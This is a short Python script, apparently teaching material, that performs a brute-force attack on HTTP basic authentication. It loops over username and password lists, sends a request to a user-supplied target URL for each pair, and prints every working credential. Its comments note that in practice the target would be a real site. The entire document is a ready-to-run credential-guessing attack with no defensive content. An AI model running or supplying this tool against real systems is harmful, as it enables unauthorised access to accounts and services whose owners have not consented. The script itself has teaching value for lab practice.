import requests

# the username/passwords list has been cleaned and shortened for teaching purposes. 
# real lists, e.g. much larger and available searching GitHub, contain extremely offensive words
f = open('usernames.txt', 'r')
usernames = f.read().splitlines()
f.close()
f = open('passwords.txt', 'r')
passwords = f.read().splitlines()
f.close()

# you can just enter http://127.0.0.1:12345 but in practice this would be a real target URL
url = input("\nInput the target URL: ")
# url = 'http://127.0.0.1:12345'

print('cracking passwords...')
for username in usernames:
    for password in passwords:
        if requests.get(url, auth=(username, password)).status_code == 200:
            print('cracked user "' +username + '" with password "'+password+'"')

print('finished cracking passwords!')